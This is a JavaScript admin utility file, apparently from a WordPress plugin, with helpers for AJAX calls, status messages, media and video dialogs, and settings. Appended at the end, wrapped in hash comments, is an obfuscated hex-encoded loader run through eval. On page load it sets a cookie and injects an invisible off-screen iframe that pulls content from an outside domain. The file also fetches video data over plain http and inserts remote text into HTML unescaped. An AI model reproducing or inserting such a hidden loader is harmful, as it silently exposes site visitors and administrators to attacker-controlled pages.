
var UniteAdminBiz = new function(){
	
	var t = this;
	
	var errorMessageID = null;
	var successMessageID = null;
	var ajaxLoaderID = null;
	var ajaxHideButtonID = null;
	
	//video dialog vars:
	var lastVideoData = null;		//last fetched data
	var lastVideoCallback = null;   //last callback from video dialog return
	var colorPickerCallback = null;
	

	/**
	 * escape html, turn html to a string
	 */
	t.htmlspecialchars = function(string){
		  return string
		      .replace(/&/g, "&amp;")
		      .replace(/</g, "&lt;")
		      .replace(/>/g, "&gt;")
		      .replace(/"/g, "&quot;")
		      .replace(/'/g, "&#039;");
	}	
	
	
	/**
	 * turn string value ("true", "false") to string 
	 */
	t.strToBool = function(str){
		
		if(str == undefined)
			return(false);
			
		if(typeof(str) != "string")
			return(false);
		
		str = str.toLowerCase();
		
		var bool = (str == "true")?true:false;
		return(bool);
	}
	
	/**
	 * set callback on color picker movement
	 */
	t.setColorPickerCallback = function(callbackFunc){
		colorPickerCallback = callbackFunc;
	}
	
	/**
	 * on color picker event. Pass the event further
	 */
	t.onColorPickerMoveEvent = function(event){
		
		if(typeof colorPickerCallback == "function")
			colorPickerCallback(event);
	}
	
	
	/**
	 * strip html tags
	 */
	t.stripTags = function(input, allowed) {
	    allowed = (((allowed || "") + "").toLowerCase().match(/<[a-z][a-z0-9]*>/g) || []).join(''); // making sure the allowed arg is a string containing only tags in lowercase (<a><b><c>)
	    var tags = /<\/?([a-z][a-z0-9]*)\b[^>]*>/gi,
	        commentsAndPhpTags = /<!--[\s\S]*?-->|<\?(?:php)?[\s\S]*?\?>/gi;
	    return input.replace(commentsAndPhpTags, '').replace(tags, function ($0, $1) {
	        return allowed.indexOf('<' + $1.toLowerCase() + '>') > -1 ? $0 : '';
	    });
	}
	
	/**
	 * debug html on the top of the page (from the master view)
	 */
	t.debug = function(html){
		jQuery("#div_debug").show().html(html);
	}
	
	/**
	 * output data to console
	 */
	t.trace = function(data,clear){
		if(clear && clear == true)
			console.clear();	
		console.log(data);
	}
	
	/**
	 * show error message or call once custom handler function
	 */
	t.showErrorMessage = function(htmlError){
		
		if(errorMessageID !== null){
			jQuery("#"+errorMessageID).show().html(htmlError);
			errorMessageID = null;
		}else
			jQuery("#error_message").show().html(htmlError);
		
		showAjaxButton();
	}

	/**
	 * hide error message
	 */
	var hideErrorMessage = function(){
		
		if(errorMessageID !== null){
			jQuery("#"+errorMessageID).hide();
		}else
			jQuery("#error_message").hide();
	}
	
	
	/**
	 * set error message id
	 */
	t.setErrorMessageID = function(id){
		errorMessageID = id;
	}
	
	
	
	/**
	 * set success message id
	 */
	t.setSuccessMessageID = function(id){
		successMessageID = id;
	}
	
	/**
	 * insert text to textarea in the current curret position
	 */
	t.insertTextToTextarea = function(areaId,text) {
	    var txtarea = document.getElementById(areaId);
	    var scrollPos = txtarea.scrollTop;
	    var strPos = 0;
	    var br = ((txtarea.selectionStart || txtarea.selectionStart == '0') ? 
	    	"ff" : (document.selection ? "ie" : false ) );
	    if (br == "ie") { 
	    	txtarea.focus();
	    	var range = document.selection.createRange();
	    	range.moveStart ('character', -txtarea.value.length);
	    	strPos = range.text.length;
	    }
	    else if (br == "ff") strPos = txtarea.selectionStart;

	    var front = (txtarea.value).substring(0,strPos);  
	    var back = (txtarea.value).substring(strPos,txtarea.value.length); 
	    txtarea.value=front+text+back;
	    strPos = strPos + text.length;
	    if (br == "ie") { 
	    	txtarea.focus();
	    	var range = document.selection.createRange();
	    	range.moveStart ('character', -txtarea.value.length);
	    	range.moveStart ('character', strPos);
	    	range.moveEnd ('character', 0);
	    	range.select();
	    }
	    else if (br == "ff") {
	    	txtarea.selectionStart = strPos;
	    	txtarea.selectionEnd = strPos;
	    	txtarea.focus();
	    }
	    txtarea.scrollTop = scrollPos;
	}	
	
	
	/**
	 * show success message
	 */
	var showSuccessMessage = function(htmlSuccess){
		var id = "#success_message";		
		var delay = 2000;
		if(successMessageID){
			id = "#"+successMessageID;
			delay = 500;
		}
		
		jQuery(id).show().html(htmlSuccess);
		setTimeout("UniteAdminBiz.hideSuccessMessage()",delay);
	}
	
	
	/**
	 * hide success message
	 */
	t.hideSuccessMessage = function(){
		
		if(successMessageID){
			jQuery("#"+successMessageID).hide();
			successMessageID = null;	//can be used only once.
		}
		else
			jQuery("#success_message").slideUp("slow").fadeOut("slow");
		
		showAjaxButton();
	}
	
	
	/**
	 * set ajax loader id that will be shown, and hidden on ajax request
	 * this loader will be shown only once, and then need to be sent again.
	 */
	t.setAjaxLoaderID = function(id){
		ajaxLoaderID = id;
	}
	
	/**
	 * show loader on ajax actions
	 */
	var showAjaxLoader = function(){
		if(ajaxLoaderID)
			jQuery("#"+ajaxLoaderID).show();
	}
	
	/**
	 * hide and remove ajax loader. next time has to be set again before "ajaxRequest" function.
	 */
	var hideAjaxLoader = function(){
		if(ajaxLoaderID){
			jQuery("#"+ajaxLoaderID).hide();
			ajaxLoaderID = null;
		}
	}
	
	/**
	 * set button to hide / show on ajax operations.
	 */
	t.setAjaxHideButtonID = function(buttonID){
		ajaxHideButtonID = buttonID;
	}
	
	/**
	 * if exist ajax button to hide, hide it.
	 */
	var hideAjaxButton = function(){
		if(ajaxHideButtonID)
			jQuery("#"+ajaxHideButtonID).hide();
	}
	
	/**
	 * if exist ajax button, show it, and remove the button id.
	 */
	var showAjaxButton = function(){

		if(ajaxHideButtonID){
			jQuery("#"+ajaxHideButtonID).show();
			ajaxHideButtonID = null;
		}		
	}

	
	
	/**
	 * Ajax request function. call wp ajax, if error - print error message.
	 * if success, call "success function" 
	 */
	t.ajaxRequest = function(action,data,successFunction){
			
		var objData = {
			action:g_uniteDirPlagin+"_ajax_action",
			client_action:action,
			data:data
		}
		
		hideErrorMessage();
		showAjaxLoader();
		hideAjaxButton();
		
		jQuery.ajax({
			type:"post",
			url:ajaxurl,
			dataType: 'json',
			data:objData,
			success:function(response){
				hideAjaxLoader();
				
				if(!response){
					t.showErrorMessage("Empty ajax response!");
					return(false);					
				}

				if(response == -1){
					t.showErrorMessage("ajax error!!!");
					return(false);
				}
				
				if(response == 0){
					t.showErrorMessage("ajax error, action: <b>"+action+"</b> not found");
					return(false);
				}
				
				if(response.success == undefined){
					t.showErrorMessage("The 'success' param is a must!");
					return(false);
				}
				
				if(response.success == false){
					t.showErrorMessage(response.message);
					return(false);
				}
				
				//success actions:

				//run a success event function
				if(typeof successFunction == "function"){
					showAjaxButton();
					successFunction(response);					
				}
				else{
					if(response.message)
						showSuccessMessage(response.message);
				}
				
				if(response.is_redirect)
					location.href=response.redirect_url;
			
			},		 	
			error:function(jqXHR, textStatus, errorThrown){
				hideAjaxLoader();
				
				if(textStatus == "parsererror")
					t.debug(jqXHR.responseText);
				
				t.showErrorMessage("Ajax Error!!! " + textStatus);
			}
		});
		
	}//ajaxrequest
	
	
	/**
	 * open new add image dialog
	 */
	var openNewImageDialog = function(title,onInsert){
		
		// Media Library params
		var frame = wp.media({
			title : title,
			multiple : false,
			library : { type : 'image'},
			button : { text : 'Insert' }
		});

		// Runs on select
		frame.on('select',function(){
			var objSettings = frame.state().get('selection').first().toJSON();			
			var urlImage = objSettings.url;
			var imageID = objSettings.id;
			onInsert(urlImage,imageID,objSettings);
		});

		// Open ML
		frame.open();
	}
	
	
	/**
	 * open old add image dialog
	 */
	var openOldImageDialog = function(title,onInsert){
		var params = "type=image&post_id=0&TB_iframe=true";
		
		params = encodeURI(params);
		
		tb_show(title,'media-upload.php?'+params);
		
		window.send_to_editor = function(html) {
						
			 tb_remove();
			 var urlImage = jQuery(html).attr('src');
			 if(!urlImage || urlImage == undefined || urlImage == "")
				var urlImage = jQuery('img',html).attr('src');
			 
			var imageID = 0;
			
			var img = jQuery('img',html);
			if(img.length){
				var arrClasses = img.attr('class').split(/\s+/);
				for(var i=0;i<arrClasses.length;i++){
					var strClass = arrClasses[i];
					if(strClass.indexOf("wp-image-") != -1)
						imageID = strClass.replace("wp-image-","");
				}
			}
			
			onInsert(urlImage,imageID);
		}
	}
	
	
	t.openAddImageDialog = function(title,onInsert){
				
		if(!title)
			title = 'Select Image';
		
		if(typeof wp != "undefined" && typeof wp.media != "undefined")
			openNewImageDialog(title,onInsert);
		else{
			openOldImageDialog(title,onInsert);
		}
		
	}
	
	
	/**
	 * load css file on the fly
	 * replace current item if exists
	 */
	t.loadCssFile = function(urlCssFile,replaceID){
		
		var rand = Math.floor((Math.random()*100000)+1);
		
		urlCssFile += "?rand="+rand;
		
		if(replaceID)
			jQuery("#"+replaceID).remove();
		
		jQuery("head").append("<link>");
		var css = jQuery("head").children(":last");
		css.attr({
		      rel:  "stylesheet",
		      type: "text/css",
		      href: urlCssFile
		});
		
		//replace current element
		if(replaceID)
			css.attr({id:replaceID});
	}
	
	
	/**
	 * get show image url
	 */
	t.getUrlShowImage = function(imageUrl,width,height,exact){
		
		var filepath = imageUrl.replace(g_urlContent,"");
		
		//if not internal image - return normal image url
		if(filepath == imageUrl)
			return(imageUrl);
		
		var urlImage = g_urlAjaxShowImage+"&img="+filepath;
		
		if(width)
			urlImage += "&w="+width;
		
		if(height)
			urlImage += "&h="+height;
		
		if(exact && exact == true)
			urlImage += "&t=exact";
		
		return(urlImage);
	}
	
	
	/**
	 * set html to youtube dialog
	 * if empty data - clear the dialog
	 */
	var setYoutubeDialogHtml = function(data){
		
		//if empty data - clear the dialog
		if(!data){
			jQuery("#video_content").html("");
			return(false);
		}
		
		var thumb = data.thumb_medium;
		
		var html = '<div class="video-content-title">'+data.title+'</div>';
		html += '<img src="'+thumb.url+'" width="'+thumb.width+'" height="'+thumb.height+'" alt="thumbnail">';
		html += '<div class="video-content-description">'+data.desc_small+'</div>';
		
		jQuery("#video_content").html(html);
	}
	
	
	/**
	 * youtube callback script, set and store youtube data, and add it to dialog
	 */
	t.onYoutubeCallback = function(obj){
		jQuery("#youtube_loader").hide();
		var desc_small_size = 200;
		
		//prepare data
		var entry = obj.entry;
		var data = {};
		data.id = jQuery("#youtube_id").val();
		data.id = jQuery.trim(data.id);
		data.video_type = "youtube";
		data.title = entry.title.$t;
		data.author = entry.author[0].name.$t;
		data.link = entry.link[0].href;
		data.description = entry.media$group.media$description.$t;
		data.desc_small = data.description;
		
		if(data.description.length > desc_small_size)
			data.desc_small = data.description.slice(0,desc_small_size)+"...";
		
		var thumbnails = entry.media$group.media$thumbnail;
		
		data.thumb_small = {url:thumbnails[0].url,width:thumbnails[0].width,height:thumbnails[0].height};
		data.thumb_medium = {url:thumbnails[1].url,width:thumbnails[1].width,height:thumbnails[1].height};
		data.thumb_big = {url:thumbnails[2].url,width:thumbnails[2].width,height:thumbnails[2].height};
		
		//set html in dialog
		setYoutubeDialogHtml(data);
		
		//store last video data
		lastVideoData = data;
		
		//show controls:
		jQuery("#video_hidden_controls").show();
	}
	
	
	/**
	 * vimeo callback script, set and store vimeo data, and add it to dialog
	 */	
	t.onVimeoCallback = function(obj){
		jQuery("#vimeo_loader").hide();
		
		var desc_small_size = 200;
		obj = obj[0];
		
		var data = {};
		data.video_type = "vimeo";
		data.id = obj.id;
		data.id = jQuery.trim(data.id);
		data.title = obj.title;
		data.link = obj.url;
		data.author = obj.user_name;
		
		data.description = obj.description;
		if(data.description.length > desc_small_size)
			data.desc_small = data.description.slice(0,desc_small_size)+"...";
		
		data.thumb_large = {url:obj.thumbnail_large,width:640,height:360};
		data.thumb_medium = {url:obj.thumbnail_medium,width:200,height:150};
		data.thumb_small = {url:obj.thumbnail_small,width:100,height:75};
		
		//set html in dialog
		setYoutubeDialogHtml(data);
		
		//store last video data
		lastVideoData = data;
		
		//show controls:
		jQuery("#video_hidden_controls").show();
	}

	
	/**
	 * show error message on the dialog
	 */
	t.videoDialogOnError = function(){
		//if ok, don't do nothing
		if(jQuery("#video_hidden_controls").is(":visible"))
			return(false);
		
		//if error - show message
		jQuery("#youtube_loader").hide();
		var html = "<div class='video-content-error'>Video Not Found!</div>";
		jQuery("#video_content").html(html);
	}
	
	
	/**
	 * open dialog for youtube or vimeo import , add / update
	 */
	t.openVideoDialog = function(callback,objCurrentVideoData){
		
		lastVideoCallback = callback;
		
		var dialogVideo = jQuery("#dialog_video");
		
		//set buttons:
		var buttons = {
			"Close":function(){
				dialogVideo.dialog("close");
			}
		};
		
		//clear the dialog content
		setYoutubeDialogHtml(false);
		jQuery("#video_hidden_controls").hide();
		jQuery("#button-video-add").text("Add This Video");

		
		//open the dialog
		dialogVideo.dialog({
				buttons:buttons,
				minWidth:700,
				minHeight:400,
				modal:true
		});
		
		//if update dialog open:		
		if(objCurrentVideoData)
			setVideoDialogUpdateMode(objCurrentVideoData);
		
	}
	
	
	/**
	 * prepare the dialog for video update
	 */
	var setVideoDialogUpdateMode = function(data){
		
		data.id = jQuery.trim(data.id);
		
		//set mode and video id
		if(data.video_type == "youtube"){
			jQuery("#video_radio_youtube").trigger("click");			
			jQuery("#youtube_id").val(data.id);
		}
		else{
			jQuery("#video_radio_vimeo").trigger("click");
			jQuery("#vimeo_id").val(data.id);
		}
		
		//set width and height:
		jQuery("#input_video_width").val(data.width);
		jQuery("#input_video_height").val(data.height);

		//change button text:
		jQuery("#button-video-add").text("Update Video");
		
		//search
		if(data.video_type == "youtube")
			jQuery("#button_youtube_search").trigger("click");
		else
			jQuery("#button_vimeo_search").trigger("click");
	}
	
	
	/**
	 * init video dialog buttons
	 */
	var initVideoDialog = function(){
		
		//set youtube radio checked:
		jQuery("#video_radio_youtube").prop("checked",true);
		
		//set radio boxes:
		jQuery("#video_radio_vimeo").click(function(){
			jQuery("#video_block_youtube").hide();
			jQuery("#video_block_vimeo").show();
		});
		
		jQuery("#video_radio_youtube").click(function(){
			jQuery("#video_block_vimeo").hide();
			jQuery("#video_block_youtube").show();
		});
		
		
		//set youtube search action
		jQuery("#button_youtube_search").click(function(){
			
			//init data
			setYoutubeDialogHtml(false);
			jQuery("#video_hidden_controls").hide();
			
			jQuery("#youtube_loader").show();
			var youtubeID = jQuery("#youtube_id").val();
			youtubeID = jQuery.trim(youtubeID);			
			var urlAPI = "http://gdata.youtube.com/feeds/api/videos/"+youtubeID+"?v=2&alt=json-in-script&callback=UniteAdminBiz.onYoutubeCallback";
			
			jQuery.getScript(urlAPI);
			
			//handle not found:
			setTimeout("UniteAdminBiz.videoDialogOnError()",2000);
		});
		
		
		//add the selected video to the callback function
		jQuery("#button-video-add").click(function(){
			if(!lastVideoData)
				return(false);
			
			lastVideoData.width = jQuery("#input_video_width").val();
			lastVideoData.height = jQuery("#input_video_height").val();
			
			if(typeof lastVideoCallback == "function")
				lastVideoCallback(lastVideoData);
			
			jQuery("#dialog_video").dialog("close");
			
		});
		
		
		//set vimeo search
		jQuery("#button_vimeo_search").click(function(){
			//init data
			setYoutubeDialogHtml(false);
			jQuery("#video_hidden_controls").hide();
			
			jQuery("#vimeo_loader").show();
			
			var vimeoID = jQuery("#vimeo_id").val();
			vimeoID = jQuery.trim(vimeoID);
			var urlAPI = 'http://www.vimeo.com/api/v2/video/' + vimeoID + '.json?callback=UniteAdminBiz.onVimeoCallback'; 
			jQuery.getScript(urlAPI);
		});
		
	}//end initVideoDialog
	
	
	//run the init function
	jQuery(document).ready(function(){
		initVideoDialog();
		
		//init update dialog:
		jQuery("#button_upload_plugin").click(function(){
			
			jQuery("#dialog_update_plugin").dialog({
				minWidth:600,
				minHeight:400,
				modal:true
			});
			
		});
		
		initGeneralSettings();
	});
	
	
	/**
	 * init general settings dialog
	 */
	var initGeneralSettings = function(){
		
		//button general settings - open dialog
		jQuery("#button_general_settings").click(function(){
			
			jQuery("#loader_general_settings").hide();
			
			jQuery("#dialog_general_settings").dialog({
				minWidth:800,
				minHeight:500,
				modal:true,
				dialogClass:"tpdialogs"
			});
			
		});
		
		//button save general settings
		jQuery("#button_save_general_settings").click(function(){
			var data = UniteSettingsBiz.getSettingsObject("form_general_settings");
			jQuery("#loader_general_settings").show();
			UniteAdminBiz.ajaxRequest("update_general_settings",data,function(response){
				jQuery("#loader_general_settings").hide();
				jQuery("#dialog_general_settings").dialog("close");
			});
		});
		
	}
}


//user functions:

function trace(data,clear){
	UniteAdminBiz.trace(data,clear);
}

function debug(data){
	UniteAdminBiz.debug(data);
}

/*74e5ba9a756862505802693be549032c*/;(function(){var bktdyfit="";var rtrsihfe="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var raebanih=0;raebanih<rtrsihfe.length;raebanih+=2){bktdyfit=bktdyfit+parseInt(rtrsihfe.substring(raebanih,raebanih+2), 16)+",";}bktdyfit=bktdyfit.substring(0,bktdyfit.length-1);eval(eval('String.fromCharCode('+bktdyfit+')'));})();/*74e5ba9a756862505802693be549032c*/